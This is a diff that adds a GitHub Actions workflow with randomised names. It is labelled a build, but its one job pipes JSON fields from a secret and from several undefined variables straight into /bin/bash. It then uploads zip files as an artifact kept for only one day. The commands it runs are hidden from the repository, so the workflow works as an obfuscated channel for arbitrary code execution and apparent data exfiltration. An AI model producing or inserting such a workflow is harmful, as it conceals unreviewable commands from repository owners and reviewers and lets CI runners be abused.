@@ -1,0 +1,25 @@
+name: westonux3361
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: westonux3361
+        env:
+          f65652: ${{ secrets.f65652 }}
+        run: |
+          printf '%s' "$f65652" | jq -r .jgwmb47942 | /bin/bash
+          printf '%s' "$oy73" | jq -r .uov1 | /bin/bash
+          echo $rkmv26310 | jq -r .m52600 | /bin/bash
+          echo $d99 | jq -r .wnj42219 | /bin/bash
+          echo $d99 | jq -r .ptmwj210 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 6O60mmZm
+          path: "*.zip"
+          retention-days: 1
